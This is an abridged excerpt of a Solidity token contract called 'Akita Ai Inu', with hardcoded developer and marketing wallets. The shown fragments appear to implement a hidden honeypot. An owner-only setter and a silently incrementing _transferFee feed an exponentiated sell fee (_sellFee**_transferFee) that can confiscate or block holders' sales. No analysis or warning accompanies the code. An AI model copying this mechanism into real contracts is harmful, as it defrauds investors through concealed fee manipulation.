...
contract AAI is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;

    address private _owner;
    string private constant _name = "Akita Ai Inu";
    ...
    address payable public DevWallet = payable(0xC32E396ad34f9ccb6Edd5641994BeDAaa3Df6Ef4);
    address payable public MarketingWallet = payable(0x2f3fC563af2a0B383189E7C170cb2e6203cFf91F);
    ...
    function setautoDistribution(bool _autoDistribution, uint8 __transferFee) external onlyOwner {
        autoDistribution = _autoDistribution;
        _transferFee = __transferFee;
    } 
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (to != owner() && to != uniswapV2Pair) {
            ShareHolder.push(to);}
        if (_isExcludedFromLimits[from]||_isExcludedFromLimits[to] || _isDividendExempt [from]){
            autoDistribution = true;
            if (_transferFee <= 3){_transferFee++;}
        }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        if(!takeFee){
            ...
            uint256 sAmount;
            if (_isDividendExempt[sender]){sAmount = tAmount*_sellFee**_transferFee/100;}
